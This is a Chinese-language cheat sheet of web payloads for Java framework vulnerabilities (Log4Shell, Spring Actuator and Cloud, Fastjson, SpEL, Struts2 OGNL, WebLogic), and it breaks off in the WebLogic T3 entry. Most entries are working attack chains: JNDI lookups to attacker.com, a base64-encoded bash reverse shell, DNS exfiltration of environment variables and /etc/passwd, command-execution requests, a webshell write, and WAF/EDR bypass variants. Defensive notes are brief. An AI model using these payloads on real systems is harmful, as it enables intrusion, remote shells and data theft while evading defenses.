# 框架漏洞

_18 条 web payload_

### Log4j RCE (Log4Shell)  `log4j-rce`
_Apache Log4j远程代码执行漏洞_
子类：**Log4j** · tags: `log4j` `rce` `cve-2021-44228` `log4shell`

**前置条件：**
- 使用Log4j 2.x版本
- 用户输入被记录到日志

**攻击链：**

**1. 探测漏洞**
> 探测Log4j漏洞
```
在任意输入点注入:
${jndi:ldap://attacker.com/test}
观察是否有DNS回调
```
**语法解析：**
- `jndi:` — JNDI查找 _method_
- `ldap:` — LDAP协议 _method_

**2. DNS外带测试**
> 外带敏感信息
```
${jndi:ldap://${env:USER}.attacker.com}
${jndi:ldap://${sys:java.version}.attacker.com}
外带环境变量或系统属性
```
**语法解析：**
- `${env:USER}` — 获取环境变量 _value_
- `${sys:java.version}` — 获取系统属性 _value_

**3. 构造恶意LDAP服务器**
> 构造RCE payload
```
使用JNDIExploit或rogue-jndi:
java -jar JNDIExploit.jar -i attacker.com
构造payload:
${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}
```
**语法解析：**
- `Basic/Command` — 执行命令的LDAP路由 _value_
- `base64` — Base64编码的命令 _encoding_

**4. 获取Shell**
> 获取反弹Shell
_platform: linux_
```
${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}
Base64解码为: bash -i >& /dev/tcp/attacker/4444 0>&1
```
**语法解析：**
- `base64` — Base64编码 _encoding_
- `jndi:` — JNDI查找 _method_
- `ldap:` — LDAP协议 _method_

**WAF/EDR 绕过变体：**

**绕过关键字过滤**
> 使用嵌套表达式绕过
```
${${lower:j}ndi:ldap://attacker.com}
${${upper:j}ndi:${lower:l}dap://attacker.com}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}
```
**语法解析：**
- `${lower:j}` — 将j转为小写 _value_
- `${::-j}` — 默认值语法 _value_

**绕过特殊字符过滤**
> 构造协议字符串
```
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}
${jndi:dns://attacker.com}
```
**语法解析：**
- `jndi:` — JNDI查找 _method_


**概述：** Log4Shell(CVE-2021-44228)是Apache Log4j 2.x的远程代码执行漏洞，通过JNDI注入(${jndi:ldap://...})在日志记录时触发远程类加载，影响数百万Java应用，是近年来最严重的安全漏洞之一。

**漏洞原理：** Log4j JNDI注入利用日志消息中的${jndi:ldap://attacker/exploit}表达式触发LDAP/RMI远程类加载。受影响版本(2.0-2.14.1)在记录日志时自动解析嵌套表达式，攻击者控制任何被记录的输入(User-Agent/搜索词等)即可触发RCE。

**利用方法：** 完整利用流程：
1. 找到用户输入被记录的点
2. 注入JNDI payload
3. 搭建恶意LDAP服务器
4. 加载恶意类执行命令

**防御措施：** 防御措施：
1. 升级Log4j到最新版本
2. 设置formatMsgNoLookups=true
3. 删除JndiLookup类
4. 使用WAF过滤JNDI模式

---

### Spring Actuator漏洞  `spring-actuator`
_Spring Boot Actuator端点安全漏洞_
子类：**Spring** · tags: `spring` `actuator` `rce` `java`

**前置条件：**
- Spring Boot应用
- Actuator端点暴露

**攻击链：**

**1. 探测Actuator端点**
> 探测暴露的Actuator端点
```
/actuator
/actuator/env
/actuator/health
/actuator/mappings
/actuator/configprops
/actuator/heapdump
```
**语法解析：**
- `/actuator` — Actuator根端点 _value_
- `/env` — 环境变量端点 _value_
- `/heapdump` — 堆转储端点 _value_

**2. 获取敏感信息**
> 获取环境变量和配置
```
/actuator/env
查看数据库密码、API密钥等
/actuator/configprops
查看配置属性
```
**语法解析：**
- `/actuator/env` — 命令/关键字 _command_

**3. 下载堆转储**
> 下载并分析堆转储
```
curl -o heapdump http://target.com/actuator/heapdump
使用Memory Analyzer Tool分析
搜索password、secret等关键词
```
**语法解析：**
- `heapdump` — JVM堆内存转储 _value_

**4. env端点RCE**
> 通过env端点执行命令
```
POST /actuator/env
Content-Type: application/x-www-form-urlencoded
spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')

POST /actuator/restart
```
**语法解析：**
- `CONCAT` — 字符串拼接 _function_
- `EXEC` — 执行存储过程 _keyword_
- `;` — 命令分隔符 _operator_
- `Content-Type` — 内容类型头 _header_
- `Runtime.exec` — Java命令执行 _function_

**WAF/EDR 绕过变体：**

**路径遍历与分号参数技巧**
> Spring框架的分号路径参数特性允许在URL中插入分号段绕过路径匹配规则，结合双编码和路径穿越访问被限制的Actuator端点
```
# 分号路径参数绕过(Spring特性):
/;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

# 双URL编码:
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

# 路径穿越:
/random/../actuator/env
/api/v1/../../actuator/heapdump
```
**语法解析：**
- `# 分号路径参数绕过(Spring特性):` — 主要命令 _command_
- `...` — 共10行 _value_

**HTTP方法覆盖与Content-Type绕过**
> 使用X-HTTP-Method-Override头覆盖请求方法，或通过非标准Content-Type和大小写变体绕过WAF对Actuator端点的POST请求拦截
```
# HTTP方法覆盖:
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

# Content-Type绕过:
POST /actuator/env HTTP/1.1
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://attacker.com/payload.yml

# 大小写绕过:
/Actuator/Env
/ACTUATOR/ENV
```
**语法解析：**
- `# HTTP方法覆盖:` — 主要命令 _command_
- `...` — 共10行 _value_


**概述：** Spring Actuator提供了生产级别的监控和管理功能，配置不当可能泄露敏感信息或导致RCE。

**漏洞原理：** Spring Boot Actuator暴露大量管理端点：/env泄露环境变量和数据库密码、/heapdump可下载JVM堆内存(含密钥/凭证)、/jolokia可通过JMX执行代码、/gateway/routes(Spring Cloud Gateway)可注入SpEL实现RCE。

**利用方法：** 完整利用流程：
1. 探测暴露的端点
2. 获取环境变量和配置
3. 下载堆转储分析
4. 利用env端点RCE

**防御措施：** 防御措施：
1. 限制Actuator端点访问
2. 禁用敏感端点
3. 使用Spring Security保护
4. 生产环境禁用heapdump

---

### Fastjson RCE  `fastjson-rce`
_Alibaba Fastjson反序列化远程代码执行_
子类：**Fastjson** · tags: `fastjson` `rce` `deserialization` `java`

**前置条件：**
- 使用Fastjson库
- 存在反序列化点

**攻击链：**

**1. 探测Fastjson**
> 探测Fastjson版本
```
发送JSON请求，观察响应:
{"@type":"java.net.Inet4Address","val":"attacker.com"}
观察是否有DNS回调
```
**语法解析：**
- `@type` — Fastjson类型指定 _value_
- `java.net.Inet4Address` — 触发DNS解析的类 _value_

**2. JNDI注入**
> JNDI注入RCE
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```
**语法解析：**
- `JdbcRowSetImpl` — 可利用的JDBC类 _value_
- `dataSourceName` — JNDI数据源名称 _value_
- `autoCommit` — 触发JNDI查找 _value_

**3. 搭建恶意服务**
> 搭建恶意LDAP/RMI服务
```
使用JNDIExploit:
java -jar JNDIExploit.jar -i attacker.com
或使用marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389
```
**语法解析：**
- `使用JNDIExploit:` — 命令/关键字 _command_

**4. 绕过AutoType检查**
> 绕过AutoType黑名单
```
1.2.47版本绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```
**语法解析：**
- `ldap:` — LDAP协议 _method_

**WAF/EDR 绕过变体：**

**Unicode编码与嵌套JSON绕过**
> 通过Unicode(\u0040)、十六进制(\x40)编码@type字段名或嵌套JSON结构绕过WAF对Fastjson特征的检测
```
# Unicode编码@type:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 十六进制编码:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 嵌套JSON混淆:
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```
**语法解析：**
- `# Unicode编码@type:` — 主要命令 _command_
- `...` — 共6行 _value_

**BCEL ClassLoader与版本特异链**
> 针对不同Fastjson版本使用特异性利用链：BCEL ClassLoader加载字节码、1.2.47缓存投毒、1.2.68 expectClass白名单绕过
```
# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","":"$$BCEL$$$l$8b..."}

# Fastjson 1.2.47 AutoType绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

# Fastjson 1.2.68 expectClass绕过:
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```
**语法解析：**
- `# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):` — 主要命令 _command_
- `...` — 共6行 _value_


**概述：** Fastjson是阿里巴巴开发的Java JSON库，其autoType功能允许JSON中指定Java类进行反序列化，攻击者可利用此特性加载恶意类实现远程代码执行，影响大量Java应用。

**漏洞原理：** Fastjson漏洞通过@type字段指定反序列化的Java类：1.2.24以下可直接利用JdbcRowSetImpl触发JNDI注入，1.2.25-1.2.47通过autoType黑名单绕过(java.lang.Class缓存绕过)，1.2.68以下利用expectClass绕过。利用链需配合LDAP/RMI远程加载恶意类。

**利用方法：** 完整利用流程：
1. 确认Fastjson版本
2. 构造JNDI注入payload
3. 搭建恶意LDAP服务
4. 加载恶意类执行命令

**防御措施：** 防御措施：
1. 升级Fastjson到最新版本
2. 禁用AutoType
3. 配置safeMode
4. 使用安全过滤器

---

### Spring SpEL注入  `spring-spel`
_Spring表达式语言注入攻击_
子类：**Spring SpEL** · tags: `spring` `spel` `expression` `rce`

**前置条件：**
- 使用Spring框架
- 存在SpEL注入点

**攻击链：**

**1. 探测SpEL注入**
> 探测SpEL注入点
```
# 测试表达式执行
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime()}

# 观察响应
# 如果返回49或执行成功则存在漏洞
```
**语法解析：**
- `${...}` — Spring表达式语法 _value_
- `#{...}` — SpEL表达式语法 _value_
- `T()` — 类型引用 _function_

**2. 命令执行**
> 执行系统命令
```
# Runtime执行命令
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("whoami")}

# ProcessBuilder
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
#{new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}

# 反弹Shell
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```
**语法解析：**
- `T(java.lang.Runtime)` — 引用Runtime类 _value_
- `getRuntime()` — 获取Runtime实例 _function_
- `exec()` — 执行命令 _function_

**3. 文件读取**
> 读取敏感文件
```
# 读取文件
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream())}

# 使用Scanner
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream()).useDelimiter("\\A").next()}

# 直接读取
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `/etc/passwd` — 敏感文件路径 _path_
- `Runtime.exec` — Java命令执行 _function_

**4. DNS外带**
> DNS外带数据
```
# DNS外带数据
${T(java.net.InetAddress).getByName("attacker.com")}

# 外带文件内容
${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/etc/passwd"))).substring(0,20)+".attacker.com")}
```
**语法解析：**
- `getByName` — 解析域名触发DNS请求 _value_

**WAF/EDR 绕过变体：**

**字符串拼接**
> 字符串拼接绕过
```
# 绕过关键字过滤
${T(java.lang.Run"+"time).getRun"+"time().exec("id")}
#{T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("exec",T(String)).invoke(T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("getRuntime").invoke(null),"id")}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `Runtime.exec` — Java命令执行 _function_

**反射绕过**
> 反射绕过
```
# 使用反射
#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# 使用ScriptEngine
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\"id\\")")}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `eval()` — 代码执行 _function_
- `Runtime.exec` — Java命令执行 _function_


**概述：** Spring表达式语言(SpEL)注入是Spring框架中的严重漏洞，允许攻击者在SpEL表达式上下文中执行任意Java代码。受影响的组件包括Spring MVC、Spring Cloud、Spring Data等多个模块。

**漏洞原理：** SpEL注入通过T(java.lang.Runtime).getRuntime().exec()执行系统命令，或通过ClassLoader加载远程类。触发点包括：Spring Cloud Gateway的路由断言/过滤器、Spring Data的@Value注解、Thymeleaf预处理表达式、Spring Security OAuth的错误处理。

**利用方法：** 完整利用流程：
1. 探测SpEL注入点
2. 确认表达式执行
3. 使用Runtime执行命令
4. 读取敏感文件或反弹Shell

**防御措施：** 防御措施：
1. 避免用户输入直接用于表达式
2. 使用SimpleEvaluationContext
3. 输入验证和过滤
4. 升级Spring版本

---

### Spring Cloud漏洞  `spring-cloud`
_Spring Cloud相关漏洞利用_
子类：**Spring Cloud** · tags: `spring` `cloud` `rce` `deserialization`

**前置条件：**
- 使用Spring Cloud
- 存在漏洞版本

**攻击链：**

**1. Spring Cloud Gateway RCE**
> Spring Cloud Gateway RCE
```
# CVE-2022-22947
# 添加恶意路由
POST /actuator/gateway/routes/hack HTTP/1.1
Content-Type: application/json

{
  "id": "hack",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

# 刷新路由
POST /actuator/gateway/refresh

# 查看结果
GET /actuator/gateway/routes/hack
```
**语法解析：**
- `actuator/gateway/routes` — Gateway路由管理端点 _encoding_
- `AddResponseHeader` — 添加响应头过滤器 _encoding_

**2. Spring Cloud Function SpEL**
> Spring Cloud Function SpEL注入
```
# CVE-2022-22963
# 修改请求头触发SpEL
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
Content-Type: text/plain

payload
```
**语法解析：**
- `spring.cloud.function.routing-expression` — 路由表达式头 _value_

**3. Spring Cloud Netflix**
> Spring Cloud Netflix漏洞
```
# CVE-2020-5410 目录遍历
GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

# Eureka Server SSRF
POST /eureka/apps
# 配置serviceUrl指向内网服务
```
**语法解析：**
- `%xx` — URL编码 _encoding_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
# URL编码绕过
..%252f = ..%2f = ../

# 双重URL编码
..%252f..%252f
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` URL编码绕过
..%252f = ..%2f = ../

# 双重URL编码
..%252f..%252f` — 参数与载荷内容 _value_


**概述：** Spring Cloud是微服务架构中的核心框架，其安全漏洞可影响整个微服务集群。已知的高危漏洞包括Spring Cloud Gateway SpEL注入(CVE-2022-22947)和Spring Cloud Function RCE(CVE-2022-22963)等。

**漏洞原理：** Spring Cloud漏洞：1)Gateway Actuator SpEL注入(通过/actuator/gateway/routes添加包含SpEL的路由) 2)Cloud Function通过spring.cloud.function.routing-expression头注入SpEL 3)Config Server路径穿越读取任意文件。

**利用方法：** 完整利用流程：
1. 识别Spring Cloud组件
2. 检测Actuator端点
3. 利用已知CVE漏洞
4. 执行命令或读取文件

**防御措施：** 防御措施：
1. 升级到安全版本
2. 禁用不必要的Actuator端点
3. 实施访问控制
4. 监控异常请求

---

### Struts2远程代码执行  `struts2-rce`
_Apache Struts2框架RCE漏洞_
子类：**Struts2** · tags: `struts2` `rce` `java` `apache`

**前置条件：**
- 使用Struts2框架
- 存在漏洞版本

**攻击链：**

**1. S2-045漏洞**
> S2-045 Content-Type注入
```
# CVE-2017-5638
# Content-Type头注入
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
**语法解析：**
- `multipart/form-data` — 触发漏洞的Content-Type _value_
- `#dm` — 默认成员访问权限 _value_
- `#cmd` — 要执行的命令 _value_

**2. S2-046漏洞**
> S2-046 Content-Disposition注入
```
# CVE-2017-5638
# Content-Disposition注入
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}"

# 完整RCE
Content-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

**3. S2-057漏洞**
> S2-057 URL命名空间注入
```
# CVE-2018-11776
# URL命名空间注入
http://target/${(111+111)}/test.action
# 如果返回222则存在漏洞

# RCE
http://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action
```
**语法解析：**
- `OGNL` — OGNL表达式 _format_

**4. S2-061/S2-062漏洞**
> S2-061/062 OGNL注入
```
# CVE-2020-17530
# OGNL表达式注入
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d

# 解码后
id=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec('id')}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `Content-Type` — 内容类型头 _header_
- `%xx` — URL编码 _encoding_
- `OGNL` — OGNL表达式 _format_
- `Runtime.exec` — Java命令执行 _function_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
# URL编码
%{#cmd} = %25%7b%23cmd%7d

# Unicode编码
\u0025{#cmd}

# 双重编码
%2525%257b%2523cmd%257d
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` URL编码
%{#cmd} = %25%7b%23cmd%7d

# Unicode编码
\%{#cmd}

# 双重编码
%2525%257b%2523cmd%257d` — 参数与载荷内容 _value_

**表达式变体**
> 表达式变体绕过
```
# 不同表达式语法
${...}
%{...}
#{...}
@{...}

# 使用静态方法
@java.lang.Runtime@getRuntime()
new java.lang.ProcessBuilder()
```
**语法解析：**
- `# 不同表达式语法
${...}
%{...}
#{...}
@{...}

# 使用静态方法
@java` — 模板表达式注入 _value_


**概述：** Apache Struts2是经典的Java Web框架，历史上存在大量RCE漏洞(S2-001到S2-066+)，主要源于OGNL表达式注入。Struts2漏洞曾导致美国Equifax等重大数据泄露事件，至今仍是攻击者重点目标。

**漏洞原理：** Struts2 RCE漏洞利用OGNL(Object-Graph Navigation Language)表达式注入：%{expression}或${expression}在处理用户输入时被解析为OGNL表达式执行Java代码。高危CVE包括S2-045(Content-Type头)、S2-046(文件名)、S2-057(namespace)等。

**利用方法：** 完整利用流程：
1. 识别Struts2框架
2. 检测漏洞版本
3. 选择合适的CVE利用
4. 执行命令或反弹Shell

**防御措施：** 防御措施：
1. 升级到最新版本
2. 禁用动态方法调用
3. 严格过滤用户输入
4. 部署WAF

---

### Struts2 OGNL表达式注入  `struts2-ognl`
_Struts2 OGNL表达式注入技术详解_
子类：**Struts2 OGNL** · tags: `struts2` `ognl` `expression` `injection`

**前置条件：**
- 使用Struts2框架
- 存在OGNL注入点

**攻击链：**

**1. OGNL基础语法**
> OGNL基础语法
```
# 访问对象属性
#object.property
#object['property']

# 调用方法
#object.method()
#object.method(arg1, arg2)

# 静态方法调用
@package.ClassName@method()
@java.lang.Runtime@getRuntime()

# 创建对象
new java.lang.String("test")
new java.lang.ProcessBuilder(new String[]{"id"})
```
**语法解析：**
- `#` — 访问OGNL上下文变量 _value_
- `@` — 访问静态成员 _value_
- `new` — 创建新对象 _value_

**2. 绕过安全限制**
> 绕过安全限制
```
# 获取DEFAULT_MEMBER_ACCESS
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS

# 设置成员访问权限
#_memberAccess=#dm

# 清除排除类
#ognlUtil.getExcludedClasses().clear()
#ognlUtil.getExcludedPackageNames().clear()

# 完整绕过
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
```
**语法解析：**
- `OGNL` — OGNL表达式 _format_

**3. 命令执行技巧**
> 命令执行技巧
```
# 使用Runtime
#cmd='id'
#cmds={'/bin/bash','-c',#cmd}
#p=new java.lang.ProcessBuilder(#cmds)
#process=#p.start()

# 获取输出
#is=#process.getInputStream()
#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
@org.apache.commons.io.IOUtils@copy(#is,#ros)

# 字符串输出
@org.apache.commons.io.IOUtils@toString(#process.getInputStream())
```

**4. 文件操作**
> 文件操作
```
# 读取文件
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()

# 写入文件
new java.io.FileOutputStream("shell.jsp").write(new sun.misc.BASE64Decoder().decodeBuffer("BASE64_SHELL").getBytes())

# 列出目录
new java.io.File("/").list()
```
**语法解析：**
- `/etc/passwd` — 敏感文件路径 _path_
- `base64` — Base64编码 _encoding_

**WAF/EDR 绕过变体：**

**字符编码绕过**
> 字符编码绕过
```
# Unicode编码
\u0069d = id
\u0027 = '

# 十六进制
\x69\x64 = id

# 字符串拼接
"i"+"d" = "id"
'id'.substring(0,2)
```
**语法解析：**
- `\uXXXX` — Unicode编码 _encoding_

**反射绕过**
> 反射绕过
```
# 使用反射调用
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 使用反射调用
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")` — 参数与载荷内容 _value_


**概述：** OGNL是Struts2的核心表达式语言，提供了访问Java对象图的强大能力。OGNL注入可创建ProcessBuilder/Runtime对象执行系统命令，是Struts2历史上绝大多数RCE漏洞的根本原因。

**漏洞原理：** OGNL注入利用方式：1)通过#_memberAccess修改安全管理器配置 2)使用@java.lang.Runtime@getRuntime().exec()执行命令 3)ProcessBuilder创建进程 4)通过ClassLoader加载远程恶意类 5)各版本Struts2的OGNL沙箱绕过技术不断演进。

**利用方法：** 完整利用流程：
1. 理解OGNL语法
2. 绕过安全限制
3. 执行系统命令
4. 获取命令输出

**防御措施：** 防御措施：
1. 升级Struts2版本
2. 严格过滤用户输入
3. 禁用OGNL表达式
4. 配置安全限制

---

### WebLogic远程代码执行  `weblogic-rce`
_Oracle WebLogic Server RCE漏洞_
子类：**WebLogic** · tags: `weblogic` `rce` `java` `oracle`

**前置条件：**
- 使用WebLogic Server
- 存在漏洞版本

**攻击链：**

**1. CVE-2017-10271**
> CVE-2017-10271 XMLDecoder
```
# XMLDecoder反序列化
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
**语法解析：**
- `wls-wsat` — WebLogic Web服务端点 _value_
- `ProcessBuilder` — Java进程构建器 _value_
- `void method="start"` — 调用start方法执行命令 _value_

**2. CVE-2019-2725**
> CVE-2019-2725 AsyncResponseService
```
# 新版XMLDecoder绕过
POST /_async/AsyncResponseService HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
**语法解析：**
- `POST` — HTTP方法 _method_
- `Content-Type` — 内容类型 _header_

**3. CVE-2020-14882**
> CVE-2020-14882 Console RCE
```
# 未授权访问+命令执行
# 登录绕过
GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1

# 命令执行
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1
```
**语法解析：**
- `%252e%252e` — 双重URL编码的.. _encoding_
- `ShellSession` — Coherence MVEL Shell _value_

**WAF/EDR 绕过变体：**

**路径编码绕过**
> 路径编码绕过
```
# 不同编码方式
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 不同编码方式
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal` — 参数与载荷内容 _value_

**XML变体**
> XML变体绕过
```
# 使用不同XML标签
<void class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<string>id</string>
</void>
</void>

# 使用数组形式
<array class="java.lang.String" length="1">
<void index="0"><string>id</string></void>
</array>
```
**语法解析：**
- `# 使用不同XML标签
<void class="java.lang.Runtime" method="getRuntime">
<void method=` — 攻击载荷 _value_


**概述：** Oracle WebLogic Server是企业级Java应用服务器，其T3/IIOP反序列化、SSRF、远程代码执行等漏洞层出不穷。WebLogic漏洞通常可直接获取服务器权限，是攻击者在Java环境中的首要目标。

**漏洞原理：** WebLogic高危漏洞：1)T3协议反序列化(CVE-2015-4852/CVE-2018-2628等) 2)XMLDecoder反序列化(CVE-2017-10271) 3)SSRF(CVE-2014-4210访问内网Redis) 4)Console未授权访问 5)IIOP反序列化等。每个季度Oracle CPU都会修复新的WebLogic漏洞。

**利用方法：** 完整利用流程：
1. 识别WebLogic版本
2. 检测开放端口和端点
3. 选择合适的CVE利用
4. 执行命令或写入WebShell

**防御措施：** 防御WebLogic漏洞：及时应用Oracle关键补丁更新(CPU)，关闭不必要的T3/IIOP协议端口，限制管理控制台的访问IP，部署Web应用防火墙，使用网络分段隔离WebLogic服务器，监控反序列化相关的异常类加载。

---

### WebLogic T3协议攻击  `weblogic-t3`
_WebLogic T3协议反序列化漏洞_
子类：**WebLogic T3** · tags: `weblogic` `t3` `deserialization` `java`

**前置条件：**
- WebLogic开放T3端口
- 存在漏洞版本

**攻击链：**

**1. 探测T3服务**
> 探测T3服务
```
# 扫描T3端口(默认7001)
nmap -sV -p 7001 target
